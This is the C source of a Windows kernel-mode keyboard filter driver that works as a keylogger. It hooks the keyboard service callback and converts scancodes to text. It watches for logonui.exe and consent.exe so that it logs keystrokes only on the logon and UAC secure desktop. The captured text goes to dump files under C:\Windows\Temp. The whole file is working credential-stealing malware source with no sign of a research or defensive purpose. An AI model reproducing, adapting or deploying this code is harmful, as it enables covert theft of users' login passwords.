#include "rmackmkl.h"
#include <stdbool.h>
#include <string.h>
#include <ctype.h>

#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
// #pragma alloc_text (INIT, DriverUnload)
#pragma alloc_text (PAGE, RMACKL_EvtDeviceAdd)
#pragma alloc_text (PAGE, RMACKL_EvtIoInternalDeviceControl)
#endif
// Handle for the log file.
HANDLE fileHandle;

// Structure that holds the global keyboard data array.
KEYBOARD_DATA_ARRAY keyboardDataArray;

// Total records written to log file.
ULONG written;

// Buffer size at which the key-logs are flushed to log file.
#define LOG_TRIGGER_POINT 1

#define PRId64       "lld"

// Size of the scancodes table.
#define SZ_KEYTABLE 0x5A

bool isCapsOn = FALSE;
bool isShift = FALSE;
bool capsBit = 0;

// Created (true) or Terminated (false) status for secure processes: logonui.exe & consent.exe
bool processStatus[] = { FALSE, FALSE };

// Whether user is on the secure desktop
bool secureScreen = FALSE;

// CHAR* outputBuffer = (char[500]){ 0 };
bool isFileReady = FALSE;

char* currFileName = (char[100]){ 0 };

ULONG lastTime = 0;
ULONG threshold = 300;

char* keytable[SZ_KEYTABLE] = {
	"[INVALID]",		// 0	00
	"[ESCAPE]",			// 1	01
	"1",				// 2	02	!
	"2",				// 3	03	@
	"3",				// 4	04	#
	"4",				// 5	05	$
	"5",				// 6	06	%
	"6",				// 7	07	^
	"7",				// 8	08	&
	"8",				// 9	09	*
	"9",				// 10	0A	(
	"0",				// 11	0B	)
	"-",				// 12	0C	_
	"=",				// 13	0D	+
	"[BACKSPACE]",		// 14	0E	
	"[TAB]",			// 15	0F
	"q",				// 16	10	Q
	"w",				// 17	11	W
	"e",				// 18	12	E
	"r",				// 19	13	R
	"t",				// 20	14	T
	"y",				// 21	15	Y
	"u",				// 22	16	U
	"i",				// 23	17	I
	"o",				// 24	18	O
	"p",				// 25	19	P
	"[",				// 26	1A	{
	"]",				// 27	1B	}
	"[ENTER]",			// 28	1C
	"[LCTRL]",			// 29	1D
	"a",				// 30	1E	A
	"s",				// 31	1F	S
	"d",				// 32	20	D
	"f",				// 33	21	F
	"g",				// 34	22	G
	"h",				// 35	23	H
	"j",				// 36	24	J
	"k",				// 37	25	K
	"l",				// 38	26	L
	";",				// 39	27	:
	"'",				// 40	28	"
	"`",				// 41	29	~
	"[LSHIFT]",			// 42	2A
	"\\",				// 43	2B	|
	"z",				// 44	2C	Z
	"x",				// 45	2D	X
	"c",				// 46	2E	C
	"v",				// 47	2F	V
	"b",				// 48	30	B
	"n",				// 49	31	N
	"m",				// 50	32	M
	",",				// 51	33	<
	".",				// 52	34	>
	"/",				// 53	35	?
	"[RSHIFT]",			// 54	36
	"*",				// 55	37
	"[LALT]",			// 56	38
	"[SPACE]",			// 57	39
	"[CAPS]",			// 58	3A
	"F1",				// 59	3B
	"F2",				// 60	3C
	"F3",				// 61	3D
	"F4",				// 62	3E
	"F5",				// 63	3F
	"F6",				// 64	40
	"F7",				// 65	41
	"F8",				// 66	42
	"F9",				// 67	43
	"F10",				// 68	44
	"[NUM]",			// 69	45
	"[SCROLL]",			// 70	46
	"[7|HOME]",			// 71	47
	"[8|UP]",			// 72	48
	"[9|PAGEUP]",		// 73	49
	"-",				// 74	4A
	"[4|LEFT]",			// 75	4B
	"5",				// 76	4C
	"[6|RIGHT]",		// 77	4D
	"+",				// 78	4E
	"[1|END]",			// 79	4F
	"[2|DOWN]",			// 80	50
	"[3|PAGEDOWN]",		// 81	51
	"[0|INSERT]",		// 82	52
	"[.|DELETE]",		// 83	53
	"[INVALID]",		// 84	54
	"[INVALID]",		// 85	55
	"[INVALID]",		// 86	56
	"F11",				// 87	57
	"F12",				// 88	58
	"="					// 89	59
};

char* keytable_alternate[SZ_KEYTABLE] = {
	"[INVALID]",		// 0	00
	"[INVALID]",		// 1	01
	"!",				// 2	02	!
	"@",				// 3	03	@
	"#",				// 4	04	#
	"$",				// 5	05	$
	"%",				// 6	06	%
	"^",				// 7	07	^
	"&",				// 8	08	&
	"*",				// 9	09	*
	"(",				// 10	0A	(
	")",				// 11	0B	)
	"_",				// 12	0C	_
	"+",				// 13	0D	+
	"[INVALID]",		// 14	0E	
	"[INVALID]",		// 15	0F
	"Q",				// 16	10	Q
	"W",				// 17	11	W
	"E",				// 18	12	E
	"R",				// 19	13	R
	"T",				// 20	14	T
	"Y",				// 21	15	Y
	"U",				// 22	16	U
	"I",				// 23	17	I
	"O",				// 24	18	O
	"P",				// 25	19	P
	"{",				// 26	1A	{
	"}",				// 27	1B	}
	"[INVALID]",		// 28	1C
	"[INVALID]",		// 29	1D
	"A",				// 30	1E	A
	"S",				// 31	1F	S
	"D",				// 32	20	D
	"F",				// 33	21	F
	"G",				// 34	22	G
	"H",				// 35	23	H
	"J",				// 36	24	J
	"K",				// 37	25	K
	"L",				// 38	26	L
	":",				// 39	27	:
	"\"",				// 40	28	"
	"~",				// 41	29	~
	"[INVALID]",		// 42	2A
	"|",				// 43	2B	|
	"Z",				// 44	2C	Z
	"X",				// 45	2D	X
	"C",				// 46	2E	C
	"V",				// 47	2F	V
	"B",				// 48	30	B
	"N",				// 49	31	N
	"M",				// 50	32	M
	"<",				// 51	33	<
	">",				// 52	34	>
	"?",				// 53	35	?
	"[INVALID]",		// 54	36
	"[INVALID]",		// 55	37
	"[INVALID]",		// 56	38
	"[INVALID]",		// 57	39
	"[INVALID]",		// 58	3A
	"[INVALID]",		// 59	3B
	"[INVALID]",		// 60	3C
	"[INVALID]",		// 61	3D
	"[INVALID]",		// 62	3E
	"[INVALID]",		// 63	3F
	"[INVALID]",		// 64	40
	"[INVALID]",		// 65	41
	"[INVALID]",		// 66	42
	"[INVALID]",		// 67	43
	"[INVALID]",		// 68	44
	"[INVALID]",		// 69	45
	"[INVALID]",		// 70	46
	"[INVALID]",		// 71	47
	"[INVALID]",		// 72	48
	"[INVALID]",		// 73	49
	"[INVALID]",		// 74	4A
	"[INVALID]",		// 75	4B
	"[INVALID]",		// 76	4C
	"[INVALID]",		// 77	4D
	"[INVALID]",		// 78	4E
	"[INVALID]",		// 79	4F
	"[INVALID]",		// 80	50
	"[INVALID]",		// 81	51
	"[INVALID]",		// 82	52
	"[INVALID]",		// 83	53
	"[INVALID]",		// 84	54
	"[INVALID]",		// 85	55
	"[INVALID]",		// 86	56
	"[INVALID]",		// 87	57
	"[INVALID]",		// 88	58
	"[INVALID]"			// 89	59
};

VOID SetCurrFileName() {
	ULONG time = 0;
	LARGE_INTEGER pTime;
	KeQuerySystemTime(&pTime);
	RtlTimeToSecondsSince1970(&pTime, &time);

	if (time - lastTime > threshold) {
		sprintf(currFileName, "\\DosDevices\\C:\\Windows\\Temp\\RMACKLDump%ld.dat\0", time);
		lastTime = time;
	}
}

/**
 Convert string to lowercase
 @param str: Input string
 @return Lowercased string
 */
char* strlwr(char* str) {
	unsigned char* p = (unsigned char*)str;
	while (*p) {
		*p = tolower((unsigned char)*p);
		p++;
	}
	return str;
}

/**
 * Initialize Keyboard Data Array, create spin lock protecting it.
 * @returns Status of the operation.
 **/
NTSTATUS InitKeyboardDataArray() {
	NTSTATUS status = STATUS_SUCCESS;

	// Set the initial index to 0
	keyboardDataArray.index = 0;

	// Create spin lock that protects the buffer.
	WDF_OBJECT_ATTRIBUTES spinLockAttributes;
	WDF_OBJECT_ATTRIBUTES_INIT(&spinLockAttributes);

	status = WdfSpinLockCreate(&spinLockAttributes, &keyboardDataArray.spinLock);

	if (!NT_SUCCESS(status)) {
		DebugPrint(("Error (WdfSpinLockCreate): 0x%x\n", status));
		return status;
	}

	return status;
}

/**
 * Add an element to the array by obtaining the
 * spin lock, performing addition, and
 * releasing the spin lock.
 * @param entry: Entry to add.
 **/
VOID AddToBuffer(PKEYBOARD_INPUT_DATA entry) {
	WdfSpinLockAcquire(keyboardDataArray.spinLock);

	keyboardDataArray.buffer[keyboardDataArray.index] = *entry;
	keyboardDataArray.index++;

	WdfSpinLockRelease(keyboardDataArray.spinLock);
}

/**
 * Dump all entries from the keyboard data buffer by
 * obtaining the spin lock, performing extraction, and
 * releasing the spin lock.
 * @param dest: Where to place the contents of the buffer.
 * @return The number of entries obtained.
 **/
DWORD DumpBuffer(PKEYBOARD_INPUT_DATA dest) {
	DWORD n = 0;

	WdfSpinLockAcquire(keyboardDataArray.spinLock);

	if (dest != NULL) {
		DWORD i;
		for (i = 0; i < keyboardDataArray.index; i++) {
			dest[i] = keyboardDataArray.buffer[i];
		}
		n = i;
		keyboardDataArray.index = 0;
	}

	WdfSpinLockRelease(keyboardDataArray.spinLock);

	return n;
}

/**
 * Open the log file for writing, create if does not exist.
 * @return Status of the operation.
 **/
NTSTATUS OpenLogFile() {
	IO_STATUS_BLOCK		ioStatusBlock;
	OBJECT_ATTRIBUTES	fileObjectAttributes;
	NTSTATUS			status;
	ANSI_STRING			AS;
	UNICODE_STRING		fileName;

	// Initialize file name
	RtlInitAnsiString(&AS, currFileName);
	RtlAnsiStringToUnicodeString(&fileName, &AS, TRUE);
	// Initialize file attributes
	InitializeObjectAttributes(
		&fileObjectAttributes,
		&fileName,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);

	status = STATUS_SUCCESS;

	// Create file
	status = ZwCreateFile(
		&fileHandle,
		GENERIC_WRITE,
		&fileObjectAttributes,
		&ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_VALID_FLAGS,
		FILE_OPEN_IF,
		FILE_RANDOM_ACCESS,
		NULL,
		0);

	if (!NT_SUCCESS(status)) {
		return status;
	}

	isFileReady = TRUE;
	return status;
}

NTSTATUS CloseLogFile() {
	isFileReady = FALSE;
	NTSTATUS status = ZwClose(fileHandle);
	return status;
}

/**
 Convert scancode to string
 @param dest: Destination string
 @param i: Hexadecimal key scancode
 @return Scancode as string
*/
CHAR* ScanCodeToCharP(char* dest, USHORT i) {
	sprintf(dest, "0x%x", i);
	return dest;
}
#define ITOA(n) ScanCodeToCharP((char [100]) { 0 }, (n) )

/**
 Write keyboard buffer to log file
 @param n: Number of records to write
 @param buffer: keyboard data buffer
 @return Status of the operation
 */
NTSTATUS WriteToLogFile(DWORD n, PKEYBOARD_INPUT_DATA buffer) {
	if (!secureScreen || !isFileReady) return STATUS_SUCCESS;

	NTSTATUS		status;
	DWORD			i;
	USHORT			scancode, flags;

	// Prepare buffer containing characters to write to the file
	CHAR writeBuffer[SZ_KEYBOARD_DATA_ARRAY * 20];
	writeBuffer[0] = '\0';

	// Write every scancode to the write buffer
	for (i = 0; i < n; i++) {
		scancode = buffer[i].MakeCode;
		flags = buffer[i].Flags;
		CHAR* key = keytable[scancode];
		char* scancodeHex = (char[4]){ 0 };
		sprintf(scancodeHex, "%#04x", scancode);

		int isKeyCaps = strcmp(key, "[CAPS]") == 0;
		int isKeyLShift = strcmp(key, "[LSHIFT]") == 0;
		int isKeyRShift = strcmp(key, "[RSHIFT]") == 0;
		if (isKeyCaps) {
			if (flags == KEY_MAKE && capsBit == 0) {
				capsBit = 1;
				isCapsOn = !isCapsOn;
			}
			if (flags == KEY_BREAK) {
				capsBit = 0;
			}
		}
		else if (isKeyLShift || isKeyRShift) {
			if (flags == KEY_MAKE) {
				isShift = TRUE;
			}
			else {
				isShift = FALSE;
			}
		}
		if (isKeyCaps || isKeyLShift || isKeyRShift || flags == KEY_BREAK) {
			continue;
		}

		if (scancode >= 0 && scancode < SZ_KEYTABLE) {
			if ((isCapsOn ^ isShift) == 0) {
				strcat(writeBuffer, key);
			}
			else {
				strcat(writeBuffer, keytable_alternate[scancode]);
			}
			//strcat(writeBuffer, "(");
			//strcat(writeBuffer, scancodeHex);
			//strcat(writeBuffer, ")");
			if (strcmp(key, "[ENTER]") == 0) {
				strcat(writeBuffer, "\r\n");
			}
		}
		else {
			strcat(writeBuffer, "[NA]");
		}
	}

	IO_STATUS_BLOCK		ioStatusBlock;
	LARGE_INTEGER		ByteOffset;

	ByteOffset.HighPart = -1;
	ByteOffset.LowPart = FILE_WRITE_TO_END_OF_FILE;

	status = STATUS_SUCCESS;

	// Write to the file
	status = ZwWriteFile(
		fileHandle,
		NULL,
		NULL,
		NULL,
		&ioStatusBlock,
		writeBuffer,
		strlen(writeBuffer),
		&ByteOffset,
		NULL);

	if (!NT_SUCCESS(status)) {
		DebugPrint(("Error (WriteToLogFile): 0x%x\n", status));
		goto Exit;
	}

Exit:
	written += n;
	return status;
}

/**
 * Installable driver initialization entry point.
 * This entry point is called directly by the I/O system.
 * @param DriverObject: Pointer to the driver object
 * @param RegistryPath: Pointer to a unicode string representing the path, to driver-specific key in the registry.
 * @return Status of the operation.
 **/
NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
	WDF_DRIVER_CONFIG               config;
	NTSTATUS                        status;

	DebugPrint(("RMAC KL Driver.\n"));

	// Initiialize driver config.
	WDF_DRIVER_CONFIG_INIT(
		&config,
		RMACKL_EvtDeviceAdd
	);

	// Specify driver's Unload function.
	// config.EvtDriverUnload = DriverUnload;

	// Create a framework driver object.
	status = WdfDriverCreate(
		DriverObject,
		RegistryPath,
		WDF_NO_OBJECT_ATTRIBUTES,
		&config,
		WDF_NO_HANDLE
	);

	if (!NT_SUCCESS(status)) {
		DebugPrint(("Error (WdfDriverCreate): 0x%x\n", status));
	}

	return status;
}

/**
 Callback when processes are created or terminated.
 @param hParentId: Handle of parent process
 @param hProcessId: Handle of current process
 @param bCreate: Whether the process was created or terminated
 */
VOID ProcessCallback(IN HANDLE hParentId, IN HANDLE hProcessId, IN BOOLEAN bCreate) {
	PEPROCESS process = NULL;
	PUNICODE_STRING processPath = NULL;
	CHAR* processName = (char[500]){ 0 };
	CHAR* processBaseName;

	NTSTATUS status = PsLookupProcessByProcessId(hProcessId, &process);
	if (!NT_SUCCESS(status)) {
		DebugPrint(("Unable to lookup process"));
		/*sprintf(outputBuffer, "Unable to lookup process");
		WriteDebugToLogFile();*/
		return;
	}
	status = SeLocateProcessImageName(process, &processPath);
	if (!NT_SUCCESS(status)) {
		DebugPrint(("Unable to locate process executable"));
		/*sprintf(outputBuffer, "Unable to locate process executable");
		WriteDebugToLogFile();*/
		return;
	}

	DebugPrint(("%s: %wZ\n", bCreate ? "Created   " : "Terminated", processPath));
	/*sprintf(outputBuffer, "%s: %wZ\n", bCreate ? "Created   " : "Terminated", processPath);
	WriteDebugToLogFile();*/

	sprintf(processName, "%wZ", processPath);
	// DebugPrint(("Process Name: %s\n", processName));

	processBaseName = strrchr(processName, '\\');

	//DebugPrint(("%s: %s\n", bCreate ? "Created   " : "Terminated", processBaseName));
	//sprintf(outputBuffer, "%s: %s\n", bCreate ? "Created   " : "Terminated", processBaseName);
	//WriteDebugToLogFile();

	if (strcmp(strlwr(processBaseName), "\\logonui.exe") == 0) {
		if (bCreate) {
			processStatus[0] = TRUE;
		}
		else {
			processStatus[0] = FALSE;
		}
	}
	else if (strcmp(strlwr(processBaseName), "\\consent.exe") == 0) {
		if (bCreate) {
			processStatus[1] = TRUE;
		}
		else {
			processStatus[1] = FALSE;
		}
	}

	if (processStatus[0] || processStatus[1]) {
		SetCurrFileName();
		OpenLogFile();
		secureScreen = TRUE;
		//sprintf(outputBuffer, "[Secure Screen START]\n");
		//WriteDebugToLogFile();
	}
	else {
		secureScreen = FALSE;
		CloseLogFile();
		//sprintf(outputBuffer, "[Secure Screen STOP]\n");
		//WriteDebugToLogFile();
	}
}

/**
 DeviceAdd routine. Called in response to AddDevice call from PnP manager.
 @param Driver: The WDF Driver
 @param DeviceInit
 @return Status of the operation
 **/
NTSTATUS RMACKL_EvtDeviceAdd(IN WDFDRIVER Driver, IN PWDFDEVICE_INIT DeviceInit) {
	WDF_OBJECT_ATTRIBUTES   deviceAttributes;
	NTSTATUS                status;
	WDFDEVICE               hDevice;
	PDEVICE_EXTENSION       filterExt;
	WDF_IO_QUEUE_CONFIG     ioQueueConfig;

	UNREFERENCED_PARAMETER(Driver);

	PAGED_CODE();

	// Register the filter driver.
	// Inherits all the device flags & characterstics from the lower device.
	WdfFdoInitSetFilter(DeviceInit);

	WdfDeviceInitSetDeviceType(
		DeviceInit,
		FILE_DEVICE_KEYBOARD
	);

	WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(
		&deviceAttributes,
		DEVICE_EXTENSION
	);

	// Create a framework device object
	status = WdfDeviceCreate(
		&DeviceInit,
		&deviceAttributes,
		&hDevice
	);

	if (!NT_SUCCESS(status)) {
		DebugPrint(("Error (WdfDeviceCreate): 0x%x\n", status));
		return status;
	}

	// Get device extension data.
	filterExt = GetDeviceExtension(hDevice);

	// Configure the default queue to be Parallel.
	WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(
		&ioQueueConfig,
		WdfIoQueueDispatchParallel
	);

	// Framework by default creates non-power managed queues
	ioQueueConfig.EvtIoInternalDeviceControl = RMACKL_EvtIoInternalDeviceControl;

	status = WdfIoQueueCreate(
		hDevice,
		&ioQueueConfig,
		WDF_NO_OBJECT_ATTRIBUTES,
		WDF_NO_HANDLE
	);

	if (!NT_SUCCESS(status)) {
		DebugPrint(("Error (WdfIoQueueCreate): 0x%x\n", status));
		return status;
	}

	// Create work item.
	CreateWorkItem(hDevice);

	// Initialize global structures, create and open.
	InitKeyboardDataArray();
	NTSTATUS result = PsSetCreateProcessNotifyRoutine(ProcessCallback, FALSE);
	if (!NT_SUCCESS(result)) {
		DebugPrint(("Error (PsSetCreateProcessNotifyRoutine): 0x%x\n", result));
		//sprintf(outputBuffer, "Error (PsSetCreateProcessNotifyRoutine): 0x%x\n", result);
		//WriteDebugToLogFile();
	}

	// Set total written records to 0
	written = 0;

	return status;
}

/**
 Dispatch routine for internal device control requests
 @param Queue: The WDF Queue.
 @param Request: The WDF Request
 @param OutputBufferLength
 @param InputBufferLength
 @param IoControlCode
 **/
VOID RMACKL_EvtIoInternalDeviceControl(IN WDFQUEUE Queue, IN WDFREQUEST Request, IN size_t OutputBufferLength, IN size_t InputBufferLength, IN ULONG IoControlCode) {
	PDEVICE_EXTENSION               devExt;
	PINTERNAL_I8042_HOOK_KEYBOARD   hookKeyboard = NULL;
	PCONNECT_DATA                   connectData = NULL;
	NTSTATUS                        status = STATUS_SUCCESS;
	size_t                          length;
	WDFDEVICE                       hDevice;
	BOOLEAN                         ret = TRUE;
	WDF_REQUEST_SEND_OPTIONS        options;

	UNREFERENCED_PARAMETER(OutputBufferLength);
	UNREFERENCED_PARAMETER(InputBufferLength);
	UNREFERENCED_PARAMETER(hookKeyboard);

	PAGED_CODE();


	hDevice = WdfIoQueueGetDevice(Queue);
	devExt = GetDeviceExtension(hDevice);

	switch (IoControlCode) {
		// Connect a keyboard class device driver to the port driver.
	case IOCTL_INTERNAL_KEYBOARD_CONNECT:
		// Only allow one connection.
		if (devExt->UpperConnectData.ClassService != NULL) {
			status = STATUS_SHARING_VIOLATION;
			break;
		}

		// Get the input buffer from the request
		status = WdfRequestRetrieveInputBuffer(Request,
			sizeof(CONNECT_DATA),
			&connectData,
			&length);
		if (!NT_SUCCESS(status)) {
			DebugPrint(("Error (WdfRequestRetrieveInputBuffer): 0x%x\n", status));
			break;
		}

		NT_ASSERT(length == InputBufferLength);

		devExt->UpperConnectData = *connectData;

		// Hook into the report chain
		// Everytime a keyboard packet is reported to the system, RMACKL_ServiceCallback will be called
		connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(hDevice);
		connectData->ClassService = RMACKL_ServiceCallback;
		break;

		// Disconnect a keyboard class device driver from the port driver.
	case IOCTL_INTERNAL_KEYBOARD_DISCONNECT:
		// Clear the connection parameters in the device extension.
		devExt->UpperConnectData.ClassDeviceObject = NULL;
		devExt->UpperConnectData.ClassService = NULL;

		status = STATUS_NOT_IMPLEMENTED;
		break;

		// Pass irrelevant control codes down the stack.
	case IOCTL_KEYBOARD_QUERY_INDICATOR_TRANSLATION:
	case IOCTL_KEYBOARD_QUERY_INDICATORS:
	case IOCTL_KEYBOARD_SET_INDICATORS:
	case IOCTL_KEYBOARD_QUERY_TYPEMATIC:
	case IOCTL_KEYBOARD_SET_TYPEMATIC:
		break;
	}

	if (!NT_SUCCESS(status)) {
		WdfRequestComplete(Request, status);
		return;
	}

	// Fire and forget the IRP
	WDF_REQUEST_SEND_OPTIONS_INIT(&options, WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);

	ret = WdfRequestSend(Request, WdfDeviceGetIoTarget(hDevice), &options);

	if (ret == FALSE) {
		status = WdfRequestGetStatus(Request);
		DebugPrint(("Error (WdfRequestSend): 0x%x\n", status));
		WdfRequestComplete(Request, status);
	}
}

/**
 * Callback when keyboard packets are
 * to be reported to the Win32 subsystem.
 * In this function the packets are added to the global
 * keyboard data buffer.
 * @param DeviceObject
 * @param InputDataStart
 * @param InputDataEnd
 * @param InputDataConsumed
 **/
VOID RMACKL_ServiceCallback(IN PDEVICE_OBJECT DeviceObject, IN PKEYBOARD_INPUT_DATA InputDataStart, IN PKEYBOARD_INPUT_DATA InputDataEnd, IN OUT PULONG InputDataConsumed) {
	PDEVICE_EXTENSION   devExt;
	WDFDEVICE			hDevice;

	hDevice = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);

	// Get the Device Extension.
	devExt = GetDeviceExtension(hDevice);

	ULONG					totalKeys;
	PKEYBOARD_INPUT_DATA	inputKey;

	totalKeys = (ULONG)(InputDataEnd - InputDataStart);
	inputKey = InputDataStart;

	DWORD i;

	// Add all keyboard data to the global array.
	for (i = 0; i < totalKeys; i++) {
		AddToBuffer(&inputKey[i]);
	}

	DWORD index = keyboardDataArray.index;

	// Check if the number of elements in the global buffer reached the threshold.
	if (index >= LOG_TRIGGER_POINT)
	{
		// Queue work item that will write the intercepted
		// data to the log file.

		// Get worker item context
		PWORKER_ITEM_CONTEXT workerItemContext = GetWorkItemContext(devExt->workItem);

		if (workerItemContext->hasRun)
		{
			// Queue the work item only when it's not running.
			workerItemContext->hasRun = FALSE;
			RMACKLQueueWorkItem(devExt->workItem);
		}
	}

	(*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR)devExt->UpperConnectData.ClassService)(
		devExt->UpperConnectData.ClassDeviceObject,
		InputDataStart,
		InputDataEnd,
		InputDataConsumed);
}

/**
 * Work item callback. Responsible for calling PASSIVE_LEVEL functions
 * like writing to log file.
 * @param WorkItem: WorkItem object created earlier
 **/
VOID WriteWorkItem(WDFWORKITEM WorkItem) {
	PWORKER_ITEM_CONTEXT context;

	context = GetWorkItemContext(WorkItem);

	// Dump the array into the worker's buffer.
	DWORD n = DumpBuffer(context->buffer);

	// Write dumped elements to the file.
	WriteToLogFile(n, context->buffer);

	// Indicate that worker has finished its job.
	context->hasRun = TRUE;
}

/**
 Create the work item
 @param DeviceObject
 @return Status of the operation
 */
NTSTATUS CreateWorkItem(WDFDEVICE DeviceObject) {
	NTSTATUS status = STATUS_SUCCESS;

	WDF_OBJECT_ATTRIBUTES		workItemAttributes;
	WDF_WORKITEM_CONFIG			workitemConfig;
	//WDFWORKITEM					hWorkItem;

	WDF_OBJECT_ATTRIBUTES_INIT(&workItemAttributes);

	WDF_OBJECT_ATTRIBUTES_SET_CONTEXT_TYPE(
		&workItemAttributes,
		WORKER_ITEM_CONTEXT
	);

	workItemAttributes.ParentObject = DeviceObject;

	// Configure the work item
	WDF_WORKITEM_CONFIG_INIT(
		&workitemConfig,
		WriteWorkItem
	);

	// Get the Device Extension
	PDEVICE_EXTENSION devExt = GetDeviceExtension(DeviceObject);

	// Create the work item
	status = WdfWorkItemCreate(
		&workitemConfig,
		&workItemAttributes,
		&(devExt->workItem)
	);

	if (!NT_SUCCESS(status)) {
		DebugPrint(("Erro (WdfWorkItemCreate): 0x%x\n", status));
		return status;
	}

	PWORKER_ITEM_CONTEXT context = GetWorkItemContext(devExt->workItem);

	// Queue the work item for the first time.
	context->hasRun = TRUE;

	return status;
}

/**
 * Enqueue the work item.
 * @param workItem: Work item to enqueue.
 **/
VOID RMACKLQueueWorkItem(WDFWORKITEM workItem) {
	WdfWorkItemEnqueue(workItem);
}

/**
 * Driver unload routine.
 * @param Driver: The WDF Driver.
 **/
 //void DriverUnload(IN WDFDRIVER Driver) {
 //	UNREFERENCED_PARAMETER(Driver);
 //	PsSetCreateProcessNotifyRoutine(ProcessCallback, TRUE);
 //	ZwClose(fileHandle);
 //}
